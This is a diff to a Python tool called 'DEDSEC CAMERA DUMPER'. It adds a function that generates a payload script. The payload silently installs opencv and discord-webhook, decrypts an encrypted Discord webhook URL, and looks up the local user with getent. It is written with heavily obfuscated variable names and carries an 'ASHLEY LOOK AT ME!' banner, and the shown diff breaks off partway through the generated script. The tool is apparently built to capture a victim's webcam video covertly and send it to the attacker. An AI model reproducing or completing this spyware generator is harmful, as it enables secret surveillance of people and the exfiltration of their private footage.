@@ -45,7 +45,7 @@ banner = '''
 '''
 
 banner1 = '''
-                [ DEDSEC CAMERA DUMPER ]
+                [ DEDSEC CAMERA DUMPER ] v.2
 
         [1]. GENERATE PAYLOAD
         [2]. IMPORT WEBHOOK
@@ -161,7 +161,7 @@ banner = ''''
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⢴⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣷⣄⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠘⣿⣷⡀⢀⠀⠀⠀⠀⠀⣀⡀⠀⣀⣠⠀⠀⠀⠀⠀⠈⢿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⣿⡟⣷⣾⡇⠀⠀⠀⠀⠙⠛⠿⠟⠁⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⣿⡇⠈⠙⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⣿⡇⠈⠙⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢀⣿⠇⠀⠀⠘⣿⠀⣀⣠⣤⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⢹⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣼⡟⠀⢸⣿⠀⠀⢀⣾⠟⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⠁⠀⠀⠀⠀⠀⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣠⣤⣤⣤⣤⣤⣴⣶⣶⠿⠿⠛⠁⢀⣠⣾⣿⣶⣶⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀
@@ -255,6 +255,231 @@ if __name__ == "__main__":
     print()
     print(tabulate([['PAYLOAD GENERATED:', f'{payload_name}.py']], tablefmt='fancy_grid'))
 
+def create_payload_vid():
+    try:
+        with open('.w.txt', 'r'):
+            pass
+    except FileNotFoundError:
+        with open('.w.txt', 'w') as file:
+            pass
+    
+    duration = int(input('\n\tEnter duration in seconds (press Enter for default 10 seconds): '))
+    payload_name = input('\n\tPAYLOAD NAME: ')
+
+    with open('.w.txt', 'r') as f:
+        api_key = f.readline().strip()
+        if not api_key:
+            print()
+            print(tabulate([['ADD WEBHOOK LINK FIRST']], tablefmt='fancy_grid'))
+            time.sleep(3)
+            return menu()
+        else:
+            pass
+        f.close()
+
+    key = Fernet.generate_key()
+    encrypted_api = encrypt(api_key, key)
+    encrypted_api_str = encrypted_api.decode()
+    key_str = key.decode()
+    char2 = 'A'
+    repl2 = '.'
+    var1 = encrypted_api_str.replace(char2, repl2)
+    var2 = key_str.replace(char2, repl2)
+    n_v_1 = sc(var1)
+    n_v_2 = sc(var2)
+
+    with open(f'{payload_name}.py', 'w') as write_p:
+            write_p.write(f"""
+import subprocess
+
+def mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8kVgYBXyjduf6(package_name):
+    print('loading..')
+    try:
+        subprocess.check_output(["pip", "show", package_name], stderr=subprocess.DEVNULL, universal_newlines=True)
+    except subprocess.CalledProcessError:
+        subprocess.call(["pip", "install", package_name], stderr=subprocess.DEVNULL, stdout=subprocess.PIPE)
+
+mbV0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8kVgYBXyjduf6 = ["opencv-python ", "discord-webhook"]
+
+for package in mbV0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8kVgYBXyjduf6:
+    mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8kVgYBXyjduf6(package)
+
+import cv2, os
+from discord_webhook import DiscordWebhook as UiNpJWciiXk
+from cryptography.fernet import Fernet
+
+def mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6(end, ends):
+    mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyJduf6mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6 = Fernet(ends)
+    mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyJduf6mbV_Ofb9oA6LxRud3fr9huB8k_VgYBXyjduf6 = mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyJduf6mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6.decrypt(end).decode()
+    return mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyJduf6mbV_Ofb9oA6LxRud3fr9huB8k_VgYBXyjduf6
+
+banner = ''''
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠾⠿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⡿⠋⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⠾⠿⠿⠛⠛⠛⠛⠻⠿⠿⢷⣶⣿⣥⡀⠀⠀⠀⠀⠀⠀⣠⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣄⣀⣴⣾⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣟⠛⢷⣦⣄⠀⣠⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⢀⣴⡿⢿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣄⠈⠙⢿⣿⣥⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢃⣴⡿⠋⠀⠈⢿⣄⠀⠀⠀⠀⠀⠀⠀⠘⠷⣦⡀⠀⣤⡀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠀⠈⢻⣦⠈⠻⡷⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠋⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠈⢿⣆⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⠀⠙⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡟⠁⠀⠀⠀⠀⠀⠀⠀⠙⣷⡀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠘⣿⠀⠀⠀⠀⣸⡟⠀⠀⠀⠠⣤⡄⢹⣿⡄⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡀⠀⠀⠀⠀⠀⠀⢸⡏⠀⢀⣿⠀⠀⠀⠀⠛⠀⠀⠀⠀⠀⠈⣿⣾⣿⣿⡀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇⠀⠀⠀⠀⠀⠀⣼⡇⠀⣸⡏⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⣿⡇⣿⣿⣧⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡷⠀⠀⠀⠀⠀⠀⣿⠀⢠⡟⠀⠀⠀⠀⠀⠈⠻⣦⡀⠀⠀⢰⣿⠁⣿⣿⣿⡆⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠸⣿⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠘⢿⡄⠀⣾⠏⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠇⠀⠀⠀⠀⠀⠀⣿⠀⠈⣿⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⢰⣿⠀⢰⣿⣿⣿⣿⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⢻⡇⠀⠀⠀⠀⠀⠀⢰⡿⠀⠀⢿⣤⣾⣿⣿⣿⣧⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⠀⣀⣤⣀⠀⠀⠀⠀⠀⢸⡟⠀⠀⠀⠀⠀⠀⠀⢻⠃⠀⢸⣷⠀⠀⠀⠀⠀⠀⣿⠇⠀⠀⢀⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⢀⡾⠋⢹⡿⠁⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠸⣦⡀⠘⣿⠀⢀⣰⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣷⠀⠀⠀⠚⠁⠀⣼⠏⠀⠀⠀⠀⠀⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⢹⡇⠀⢿⣶⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⣸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⣿⣴⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⠟⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣇⣤⣾⣿⣿⣿⣿⣿⢿⣿⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣿⣷⡦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡿⠛⠁⢸⣿⠀⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢠⣿⢛⣭⣷⣶⣶⣶⣾⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣶⣶⣶⣶⣦⣄⠀⠰⣿⣿⣿⡿⠟⢿⣇⠀⠀⢸⡟⠀⠀⠐⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢸⡇⣿⠏⠀⠀⠀⠀⠈⠙⢷⣄⠀⠀⠀⠀⣠⡾⠛⠉⠀⠀⠀⠀⠈⠹⣷⠀⣿⡿⠋⠀⠀⠀⢿⡄⠀⣿⠃⠀⠀⠀⠘⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠸⣧⢻⣧⣤⣤⣤⣾⣷⣄⣀⣿⣆⠀⠀⣴⣟⣀⣀⣠⣶⣦⣀⣀⣀⣠⣿⢡⣿⠁⠀⠀⠀⠀⢸⣿⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠙⣧⡙⢿⣭⣉⠉⠉⠉⠉⣹⡟⠀⠐⣿⡛⠛⠛⠛⠛⠛⠛⣛⣿⡿⣣⣿⠋⠀⠀⠀⠀⢀⣾⠃⠀⢹⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢷⣭⣛⠿⠿⠶⠾⠟⠁⠀⠀⠙⠿⣶⣶⣶⣶⡶⢿⣿⣿⣿⣿⠁⠀⠀⠀⠀⢠⣿⠃⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣾⣿⡟⢿⣆⠹⣷⡀⠀⠀⢀⣿⠃⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣧⡈⠛⢷⣌⠻⣧⡙⣷⡄⠀⠘⠃⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀ASHLEY LOOK AT ME!⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⠀⠀⠀⠀⠀⠀⠀⣶⡶⣶⣿⣿⣷⣤⡙⣷⣝⣿⣜⢿⡄⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠀⠙⢷⣦⣈⠛⢿⣿⣿⣮⡻⣿⣿⡌⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣶⣌⠛⢿⣿⠈⠛⠃⠀⠙⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⡏⠻⣷⣄⠀⠀⠀⠀⣀⠀⠀⠹⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠏⠀⠀⢀⣀⣠⣤⣤⣄⡀⢿⣿⡇⠀⠈⠻⣧⡀⠀⠀⢻⣆⠀⠀⠈⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢿⣷⣶⣿⣿⡿⠛⠉⢉⣉⣹⣿⣶⣻⣷⡀⠀⠀⠙⣷⡄⠀⠈⢻⣆⠀⠀⠀⠉⠻⢶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣉⣿⣷⣤⣀⣀⣉⣀⣀⣼⣿⣿⠃⠀⠀⠀⢹⣷⠀⠀⠀⢈⣠⣾⣿⣦⡀⠀⠙⠻⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢼⣿⣭⣭⣭⣍⡉⠙⠛⠋⣩⣿⣿⣄⣀⣀⣠⣾⠃⣀⣴⣾⠿⠛⠁⠈⠙⠻⣷⣤⣀⠈⠙⠻⣦⣄⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⣿⡿⠉⠀⠀⠀⠀⠉⠀⠉⠛⢻⣿⠟⣡⣾⣿⣿⣤⣤⣤⣄⣀⡀⠀⠀⠙⠻⣷⣤⡀⠀⠙⠻⣦⣄⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣧⡀⠀⠀⠀⠀⣠⣤⠀⢠⣿⠃⣴⡿⠉⡿⠛⠁⠀⠈⠉⠛⠛⠻⠷⠶⣶⣾⣿⣿⣦⡀⠀⠈⠙⢷⣦⡀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢿⣶⣶⣶⡿⠟⠁⠀⠸⣿⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⡀⠀⠀⠀⠀⠀⠉⠛⠀⠀⠀⠀⠙⢿⣆
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠘⠻⠿⢿⣿⣿⣿⣿⡿⣿⣶⣶⣶⣤⣤⣤⣤⣠⣤⣼⡿
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⢴⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣷⣄⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠘⣿⣷⡀⢀⠀⠀⠀⠀⠀⣀⡀⠀⣀⣠⠀⠀⠀⠀⠀⠈⢿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⣿⡟⣷⣾⡇⠀⠀⠀⠀⠙⠛⠿⠟⠁⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⣿⡇⠈⠙⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢀⣿⠇⠀⠀⠘⣿⠀⣀⣠⣤⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⢹⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣼⡟⠀⢸⣿⠀⠀⢀⣾⠟⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⠁⠀⠀⠀⠀⠀⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣠⣤⣤⣤⣤⣤⣴⣶⣶⠿⠿⠛⠁⢀⣠⣾⣿⣶⣶⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣤⣾⡿⠿⠛⠛⠋⠉⣉⣉⣉⣁⣀⣠⣤⣤⣤⣴⣾⡿⠟⠋⠁⠀⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀
+⠀⠀⢀⣾⠟⠁⠀⠀⠀⣿⣿⣿⡿⠛⠛⠛⠛⠿⠛⠛⠹⢷⣶⣶⣶⣶⣶⣾⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀
+⠀⢀⣾⠃⠀⠀⠀⠀⠀⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⢉⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀
+⠀⣾⣿⠀⠀⠀⢀⡀⠀⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀
+⣼⣿⣿⢰⡗⠀⣼⡇⢸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠛⣿⣿⣿⣶⣤⣄⣀⣀⣀⣀⣀⣀⣀⣠⣤⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀
+⣿⣿⡇⣾⠃⢰⣿⠀⢸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋⠉⠉⠉⠉⢻⣿⣿⣿⣧⠀⠀⠀⠀⠀
+⢿⣿⢣⣿⠀⣼⣿⡀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠘⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⠀
+⠘⣿⣼⡏⠀⣿⣿⣧⣸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀
+⠀⢿⣿⣷⠀⢸⣧⠻⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣦⡀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⢿⣿⡇⠀⠀⠀⠀
+⠀⠀⠙⠻⢷⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣷⣦⣤⣤⣘⡿⠋⠀⠻⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⡟⠁⠀⠙⠁⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⡿⠿⢛⣃⣬⡿⠻⠿⠿⠿⠀⠀⠀⣹⣿⣿⣷⣀⠀⠀⠀⠀⠀⠀⠘⠻⢿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⢉⣠⡶⠟⠛⠋⠁⠀⠀⣀⣠⣤⣴⣶⠿⠿⣿⣿⠿⠿⣷⣶⣤⣤⣤⡄⠀⠀⠀⠉⠻⢿⣿⣿⣦⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⢿⣿⣶⣶⣶⣶⣾⣿⣿⣿⠿⠋⣡⣴⠾⠟⠛⣩⣴⣶⠿⠛⠛⠛⠋⠁⠀⠀⠀⠀⢀⣨⣿⣿⣿⡇⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠁⠀⠀⣿⣷⣶⣿⣋⣀⣠⣴⡿⠋⠁⠀⠀⢀⣀⣠⣤⣴⣶⣶⣶⣿⣿⡿⠿⠟⠋⠁⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠿⠿⢿⣿⣶⠾⠿⠿⠿⠛⠛⠋⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+'''
+
+JcJG140h1SB9b8dsVZ8HZGi40h2SB9b8dsVZ8HZG1h1Stt1rnu4Eu = subprocess.check_output(['getent','passwd', '1000'])
+JcJG140h1SB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZG1h1Stt1rnu4Eu = JcJG140h1SB9b8dsVZ8HZGi40h2SB9b8dsVZ8HZG1h1Stt1rnu4Eu.decode().split()
+
+for JcJG140h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG1h1Stt1rnu4Eu in JcJG140h1SB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZG1h1Stt1rnu4Eu:
+    JcJGi40h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG1hiStt1rnu4Eu = 'echo "' + JcJG140h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG1h1Stt1rnu4Eu  + '" | cut -d: -f1'
+    JcJG140h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG1hiStt1rnu4Eu = subprocess.check_output(JcJGi40h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG1hiStt1rnu4Eu, shell=True)
+    global JcJGi40h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG140hiStt1rnu4Eu
